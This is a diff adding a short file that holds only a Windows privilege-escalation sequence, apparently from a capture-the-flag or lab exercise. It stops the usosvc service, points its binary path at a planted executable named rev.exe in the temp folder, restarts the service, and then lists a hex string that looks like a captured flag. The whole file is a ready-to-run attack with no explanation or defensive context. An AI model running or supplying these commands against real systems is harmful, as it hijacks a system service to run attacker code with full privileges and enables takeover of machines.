@@ -1,0 +1,8 @@
+sc stop usosvc
+
+
+sc config usosvc binpath="c:\windows\temp\rev.exe"
+
+sc start usosvc
+
+d35525fa95deececc866aa7e9e5ba45a
